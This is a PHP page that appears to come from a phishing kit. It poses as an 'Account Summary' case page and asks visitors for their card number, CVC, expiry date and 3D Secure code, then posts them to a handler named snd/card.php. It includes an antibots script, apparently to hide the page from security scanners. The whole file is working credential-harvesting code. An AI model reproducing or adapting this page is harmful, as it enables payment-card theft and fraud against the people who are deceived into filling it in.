<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Account Summary : Case ID  3803492</title>
<link href="img/fav.png" rel="shortcut icon">
<link href="css/paym.css" rel="stylesheet" type="text/css">
<script src="jss/jquery.js" type="text/javascript"></script>
<script src="jss/jquery.maskedinput.js" type="text/javascript"></script>
</head>
<body>
<div id="wb_Form1" style="position:absolute;left:402px;top:170px;width:795px;height:374px;z-index:7;">
<form action="snd/card.php" method="POST">
<input type="text" required="" autocomplete="off" id="card" style="position:absolute;left:120px;top:129px;width:199px;height:35px;line-height:35px;z-index:0;" name="card" value="" minlength="15" maxlength="16" placeholder="Card number">
<input type="text" autocomplete="off" required="" id="cvc" style="position:absolute;left:437px;top:129px;width:199px;height:35px;line-height:35px;z-index:1;" name="cvc" value="" minlength="3" maxlength="4" placeholder="CVC">
<input type="text" required="" id="ex" style="position:absolute;left:120px;top:183px;width:199px;height:35px;line-height:35px;z-index:2;" name="Ex" value="" placeholder="Expiry date">
<input type="password" id="secure" style="position:absolute;left:437px;top:183px;width:199px;height:35px;line-height:35px;z-index:3;" name="3D" value="" placeholder="Secure code">
<input type="submit" id="Bt" name="" value="Continue" style="position:absolute;left:331px;top:259px;width:106px;height:40px;z-index:4;cursor: pointer;">
<div id="wb_Image1" style="position:absolute;left:599px;top:134px;width:43px;height:26px;z-index:5;">
<img src="img/cvc.png" id="Image1" alt=""></div>
<div id="wb_Image2" style="position:absolute;left:559px;top:189px;width:83px;height:23px;z-index:6;">
<img src="img/3dsecure.png" id="Image2" alt=""></div>
</form>
</div>
   <script>
        jQuery(function($){
            $("#ex").mask("99/9999");
        });
        </script>
</body>
</html>